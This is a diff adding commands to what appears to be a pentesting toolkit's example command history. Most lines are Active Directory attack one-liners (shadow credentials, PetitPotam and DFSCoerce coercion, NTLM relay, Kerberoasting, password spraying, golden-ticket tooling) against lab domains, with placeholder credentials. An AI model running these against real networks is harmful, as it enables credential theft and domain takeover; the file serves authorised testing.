@@ -297,11 +297,14 @@ cmsmap -F -d http://192.168.10.10/
 clusterd -i http://192.168.10.10/
 dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.10.10/
 moodlescan -r -u http://192.168.10.10/
-pywhisker.py -v -d 'domain.local' -u 'user2' -H '126f1f9fdb9a7d9c7ba8d269728b7da0' -t 'sv01$' -a 'add' -o 'sv01'
+pywhisker.py -v -d 'domain.local' -u 'user2' -H '126f1f9fdb9a7d9c7ba8d269728b7da0' -t 'sv01$' -a 'add'
 gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' 'domain.local'/'sv01$' 'sv01.ccache'
 KRB5CCNAME='sv01.ccache' getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' 'domain.local'/'sv01$'
 petitpotam.py 192.168.56.1 dc01.breaking.bad
 petitpotam.py -d breaking.bad -u someaccount -p somepassword 192.168.56.1 dc01.breaking.bad
+dfscoerce.py -d breaking.bad -u someaccount -p somepassword 192.168.56.1 dc01.breaking.bad
+coercer -d 'BREAKING.BAD' -u 'someuser' -p 'somepassword' --listener 192.168.56.1 --target dc01.breaking.bad
+coercer -d 'BREAKING.BAD' -u 'someuser' -p 'somepassword' --webdav-host 'machine_name' --target dc01.breaking.bad
 ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
 targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o Kerberoastables.txt
 pass-station search tomcat
@@ -315,6 +318,8 @@ prips 192.168.0.0 192.168.0.255
 prips -i4 192.168.0.10 192.168.0.250
 prips 173.0.84.0/24 | hakrevdns
 nuclei -u https://example.com
+httpx -probe -list hosts.txt -tech-detect -status-code -fr
+prips 192.168.56.1/24|hakrevdns -d|httpx -probe -tech-detect -status-code -fr
 ntpdate -u 192.168.56.101
 renameMachine.py -current-name "testcomputer$" -new-name "DC01" -dc-ip dc01 "domain"/"user1":"complexpassword"
 getTGT.py -dc-ip dc01 "domain.local"/"DC01":"123pentest"
@@ -342,4 +347,8 @@ certipy find -dc-ip 'domaincontroller' -scheme ldap 'domain.local'/'user':'passw
 LdapRelayScan.py -method BOTH -dc-ip 192.168.56.101 -u 'someuser' -p 'somepassword'
 goldencopy --tools all --password exegol4thewin --stealth --krbtgt 060ee2d06c5648e60a9ed916c9221ad19d90e5fb7b1cccf9d51f540fe991ada1 "john"
 crackhound.py --verbose --password "exegol4thewin" --plain-text --plain-text --domain "BREAKING.BAD" --file ownedusers.txt --add-password
+kerbrute userenum -d BREAKING.BAD usernames.txt
+kerbrute passwordspray -d BREAKING.BAD domain_users.txt Password123
+kerbrute bruteuser -d BREAKING.BAD passwords.lst thoffman
+tls-scanner -connect example.com:443
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
